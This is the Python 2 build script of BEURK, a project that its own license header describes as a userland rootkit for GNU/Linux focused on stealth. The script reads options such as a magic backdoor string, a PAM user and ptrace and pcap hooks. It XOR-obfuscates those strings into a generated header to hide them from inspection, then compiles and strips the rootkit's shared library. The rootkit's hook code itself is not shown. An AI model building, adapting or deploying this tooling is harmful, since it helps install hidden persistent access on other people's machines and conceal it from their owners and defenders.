#!/usr/bin/env python2

import sys, os
import commands
from pprint import pprint

def help():
    """display usage help message and exit
    """
    print("Usage: %s <config-file>" % sys.argv[0])
    sys.exit(1)

def abort(msg):
    """abort builder with given error message
    """
    sys.exit("%s: *** %s ***" % (sys.argv[0], msg))

def fatal_error(msg):
    """abort with fatal error.
    it means that something is missing in builder's code
    and something MUST be patched
    """
    sys.exit("[BUILDER FATAL ERROR]: %s" % msg)

if len(sys.argv) != 2:
    help()


###############################################################################
### parse config file and beurk env vars

# special types for config var values
def type_str(v):
    assert str(v)
    return str(v)

def type_hidden_literal(v):
    return type_str(v)

def type_bool(v):
    assert v.lower() in ["true", "false"]
    return True if v.lower() == "true" else False

def type_int(v):
    return int(v)

def type_hexbyte(v):
    v = int(v, 16)
    assert -1 < v < 0x100
    return v

# the list of config keys (with their associated expected type)
CONFIG_KEYS = {
        "LIBRARY_NAME": type_str,
        "DEBUG_LEVEL": type_int,
        "DEBUG_FILE": type_hidden_literal,
        "ENABLE_PTRACE": type_bool,
        "ENABLE_PAM": type_bool,
        "ENABLE_PCAP": type_bool,
        "ENABLE_SSL": type_bool,
        "CC": type_str,
        "XOR_KEY": type_hexbyte,
        "MAGIC_STRING": type_hidden_literal,
        "PAM_USER": type_hidden_literal,
        }

def get_config(lines, check_missing_vars=True):
    result = {}
    for lineno, line in enumerate(lines, 1):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if '=' not in line:
            raise SyntaxError("line %d: expected key=val" % lineno)
        key, val = [x.strip() for x in line.split("=", 1)]
        if key in result.keys():
            raise SyntaxError("line %d: %r declared twice" % (lineno, key))
        if key not in CONFIG_KEYS.keys():
            raise SyntaxError("line %d: unknown key: %r" % (lineno, key))
        func_ptr = CONFIG_KEYS[key]
        try:
            val = func_ptr(val)
        except Exception as e:
            func_name = func_ptr.__name__.replace("_", " ")
            msg = "line %d: %r expects %s"
            raise SyntaxError(msg % (lineno, key, func_name))
        result[key] = val
    if check_missing_vars:
        for expected_key in CONFIG_KEYS.keys():
            if expected_key not in result.keys():
                raise SyntaxError("key %r is not defined" % expected_key)
    return result

# read config file
try:
    config_lines = open(sys.argv[1]).read().splitlines()
    config = get_config(config_lines)
except Exception as e:
    sys.stderr.write("config file error: %s:\n" % sys.argv[1])
    sys.exit("-> %s" % e)

# read beurk environment variables
for key, val in os.environ.items():
    if not key.startswith("BEURK_"):
        continue
    try:
        config.update(get_config([key[6:] + "=" + val], False))
    except SyntaxError as e:
        e = str(e)
        if e.startswith("line 1:"):
            e = e[8:]
        errmsg = "environment override error (on %r):\n"
        sys.stderr.write(errmsg % key)
        sys.exit("-> %s" % e)


###############################################################################
### chdir to project's root

ret, out = commands.getstatusoutput("git rev-parse --show-toplevel")
if ret == 0:
    os.chdir(out.strip())


###############################################################################
### generate config.h header file

HEADER = """/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

"""


# add all config vars to header
# (except for type_str and type_hidden_literal)
macros = ""
macro_tpl = "#define %(key)s (%(value)s)\n"
for key, _type in CONFIG_KEYS.items():
    if _type in [type_str, type_hidden_literal]:
        continue
    value = config[key]
    if _type == type_int:
        pass
    elif _type == type_hexbyte:
        value = hex(value)
    elif _type == type_bool:
        value = int(value)
    else:
        fatal_error("no determined action for %r" %  _type.__name__)
    macros += macro_tpl % {"key": key, "value": value}

HEADER += macros


# add hidden literals to config.h

def xor(string):
    """xor (obfuscate) given string with XOR_KEY config var
    """
    key = config["XOR_KEY"]
    result = "{"
    for char in string:
        result += "%s, " % hex(ord(char) ^ key)
    result += "0x00},"
    return result

literals_code = """
#define NUM_LITERALS (%(num_literals)d)
#define MAX_LITERAL_SIZE (%(max_literal_size)d)

static char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
    %(literals)s
};

%(literals_macros)s
"""

literals = []
literals_macros = []
max_literal_size = 0
num_literals = 0
macro_tpl = "#define %s ((const char *)(__hidden_literals[%d]))"

for key, _type in CONFIG_KEYS.items():
    if _type != type_hidden_literal:
        continue
    value = config[key]
    literals.append(xor(value))
    literals_macros.append(macro_tpl % (key, num_literals))
    max_literal_size = max(max_literal_size, len(value))
    num_literals += 1

max_literal_size += 1

HEADER += literals_code % {
        "literals": "\n    ".join(literals),
        "max_literal_size": max_literal_size + 1,
        "num_literals": num_literals,
        "literals_macros": "\n".join(literals_macros),
        }


# write HEADER into config.h
open("includes/config.h", 'w').write(HEADER)


###############################################################################
### check dependencies

def check_lib_dependencies(*checklibs):
    """test current system for BEURK dependencies
    """
    deps = {"libpam": "security/pam_appl.h",
            "libssl": "openssl/sha.h",
            "libpcap": "pcap/pcap.h"}
    include_path = [
            "/usr/include",
            "/usr/local/include"]
    missing_deps = 0

    for dep, header in deps.items():
        if dep not in checklibs:
            continue
        for include_dir in include_path:
            header_path = os.path.join(include_dir, header)
            if os.path.isfile(header_path):
                break
        else:
            msg = "Dependency not satisfied: %s-dev (header files)."
            sys.stderr.write("%s\n" % msg % dep)
            missing_deps += 1
    return False if missing_deps else True

checklibs = []
if config["ENABLE_PCAP"]:
    checklibs.append("libpcap")
if config["ENABLE_PAM"]:
    checklibs.append("libpam")
if config["ENABLE_SSL"]:
    checklibs.append("libssl")

if not check_lib_dependencies(*checklibs):
    abort("missing dependencies")


###############################################################################
### compile library

def run_build_command(cmd):
    """function which runs a build shell command
    """
    cmd = cmd.format(**config)
    print(cmd)
    if os.system(cmd) != 0:
        abort("build command failed")

SOURCES = [
        "src/beurk.c",
        "src/hook.c",
        ]

config["CFLAGS"] = """
-Iincludes -Wall -Wextra
-Wdisabled-optimization -Winline
-Wunsuffixed-float-constants
-Wdouble-promotion -Wunknown-pragmas
-Wno-unknown-warning-option
-mtune=native
""".replace("\n", " ")

config["LDFLAGS"] = "-lc -ldl -lutil "
if config["ENABLE_PAM"]:
    config["LDFLAGS"] += "-lpam "

# build objects from sources
for source in SOURCES:
    dest = source.replace(".c", ".o")
    run_build_command("{CC} {CFLAGS} -fPIC -g -c %s -o %s" % (source, dest))

# build library from objects
objects = " ".join([x.replace(".c", ".o") for x in SOURCES])

if "unknown option" in commands.getoutput("ld -soname /dev/null").lower():
    set_ld_soname = ""
else:
    set_ld_soname = "-Wl,-soname,{LIBRARY_NAME} ".format(**config)

run_build_command("{CC} -fPIC -shared " + set_ld_soname \
        + objects + " {LDFLAGS} -o {LIBRARY_NAME}")

# strip if no debug mode
if config["DEBUG_LEVEL"] == 0:
    run_build_command("strip {LIBRARY_NAME}")
